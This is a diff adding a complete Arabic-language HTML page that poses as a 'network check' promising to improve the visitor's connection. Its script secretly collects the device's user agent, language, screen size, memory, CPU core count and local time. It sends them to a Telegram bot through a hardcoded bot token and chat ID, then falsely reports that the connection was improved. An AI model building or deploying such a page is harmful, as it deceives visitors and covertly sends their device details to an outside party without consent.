@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>فحص الشبكة</title>
+<style>
+body { font-family: sans-serif; text-align: center; padding: 30px; background: #f5f5f5; }
+.box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px #ccc; display: inline-block; margin-top: 50px; }
+.loader { width: 50px; height: 50px; border: 5px solid #ddd; border-top-color: #4CAF50; border-radius: 50%; animation: spin 1s infinite; margin: 20px auto; }
+@keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="box">
+  <h3>جاري تحسين الاتصال...</h3>
+  <div class="loader"></div>
+  <p id="msg">يرجى الانتظار...</p>
+</div>
+<script>
+setTimeout(function(){
+  var data = '📱 *جهاز جديد فتح الرابط* \n' +
+    '⏰ الوقت: ' + new Date().toLocaleString('ar-SA') + '\n' +
+    '🖥️ النظام: ' + navigator.userAgent + '\n' +
+    '🌐 اللغة: ' + navigator.language + '\n' +
+    '📐 الشاشة: ' + screen.width + 'x' + screen.height + '\n' +
+    '🧠 الرام: ' + (navigator.deviceMemory || 'غير معروف') + ' GB\n' +
+    '⚡ النوى: ' + (navigator.hardwareConcurrency || 'غير معروف');
+
+  var token = '7588727229:AAG-CkeSk97WYT5i0KVq2w1HbJkODlEVsaY';
+  var chatId = '798215051';
+  var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(data) + '&parse_mode=Markdown';
+
+  fetch(url).then(function(){
+    document.getElementById('msg').innerHTML = '✅ تم تحسين الاتصال! شكراً للانتظار.';
+  }).catch(function(){
+    document.getElementById('msg').innerHTML = '✅ تم تحسين الاتصال! شكراً للانتظار.';
+  });
+}, 3000);
+</script>
+</body>
+</html>
